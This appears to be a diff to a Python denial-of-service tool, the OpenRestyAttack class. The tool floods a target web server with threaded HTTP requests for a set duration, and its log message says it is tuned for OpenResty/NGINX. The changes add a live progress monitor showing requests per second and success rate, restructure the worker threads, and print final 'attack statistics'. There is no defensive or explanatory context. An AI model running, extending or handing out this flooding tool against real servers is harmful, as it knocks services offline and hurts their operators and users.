@@ -20,6 +20,8 @@ class OpenRestyAttack:
         self.lock = threading.Lock()
         self.timeout = 2  # Reduced timeout for faster retry
         self.retry_count = 3
+        self.start_time = None
+        self.is_running = False
         self.setup_logging()
         self.setup_session()
         
@@ -138,44 +140,91 @@ class OpenRestyAttack:
                 if response.status_code in [200, 201, 202, 204]:
                     self.success_count += 1
                     
-            self.logger.debug(f"Request successful: {response.status_code}")
             return response
             
         except Exception as e:
             with self.lock:
                 self.error_count += 1
-            self.logger.debug(f"Request error: {str(e)}")
             return None
 
     def _attack_worker(self):
-        end_time = time.time() + self.duration
-        while time.time() < end_time:
+        while self.is_running and time.time() < self.start_time + self.duration:
             self._send_request()
+
+    def _progress_monitor(self):
+        """Monitor and display progress every second"""
+        last_request_count = 0
+        last_time = time.time()
+        
+        while self.is_running and time.time() < self.start_time + self.duration:
+            current_time = time.time()
+            elapsed = current_time - self.start_time
+            remaining = self.duration - elapsed
+            
+            # Calculate current RPS
+            current_requests = self.request_count
+            time_diff = current_time - last_time
+            rps = (current_requests - last_request_count) / time_diff
+            
+            # Update last values
+            last_request_count = current_requests
+            last_time = current_time
+            
+            # Calculate success rate
+            success_rate = (self.success_count / current_requests * 100) if current_requests > 0 else 0
+            
+            # Clear line and print progress
+            print(f"\r\033[K", end="")  # Clear current line
+            print(
+                f"Time: {elapsed:.1f}s/{self.duration}s | "
+                f"Requests: {current_requests} | "
+                f"RPS: {rps:.1f} | "
+                f"Success: {success_rate:.1f}% | "
+                f"Errors: {self.error_count} | "
+                f"Remaining: {remaining:.1f}s",
+                end="", flush=True
+            )
+            
+            time.sleep(1)  # Update every second
+        print()  # New line after completion
 
     def run(self):
         self.logger.info(f"Starting attack on {self.url}")
         self.logger.info("Optimized for OpenResty/NGINX servers")
         
+        self.start_time = time.time()
+        self.is_running = True
+        
+        # Start progress monitor in separate thread
+        monitor_thread = threading.Thread(target=self._progress_monitor)
+        monitor_thread.start()
+        
+        # Start attack workers
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = [
                 executor.submit(self._attack_worker)
                 for _ in range(self.threads)
             ]
             
-        for future in futures:
-            future.result()
-            
+            # Wait for all workers to complete
+            for future in futures:
+                future.result()
+        
+        self.is_running = False
+        monitor_thread.join()  # Wait for monitor to finish
+        
         self.print_stats()
 
     def print_stats(self):
-        """Print attack statistics"""
-        self.logger.info("=== Attack Statistics ===")
-        self.logger.info(f"Total Requests: {self.request_count}")
-        self.logger.info(f"Successful Requests: {self.success_count}")
-        self.logger.info(f"Failed Requests: {self.error_count}")
+        """Print final attack statistics"""
+        print("\n=== Final Attack Statistics ===")
+        print(f"Total Requests: {self.request_count}")
+        print(f"Successful Requests: {self.success_count}")
+        print(f"Failed Requests: {self.error_count}")
         if self.request_count > 0:
-            self.logger.info(f"Success Rate: {(self.success_count/self.request_count)*100:.2f}%")
-        self.logger.info(f"Requests per Second: {self.request_count/self.duration:.2f}")
+            print(f"Success Rate: {(self.success_count/self.request_count)*100:.2f}%")
+        print(f"Average RPS: {self.request_count/self.duration:.2f}")
+        print(f"Duration: {self.duration} seconds")
 
 def validate_input():
     while True:
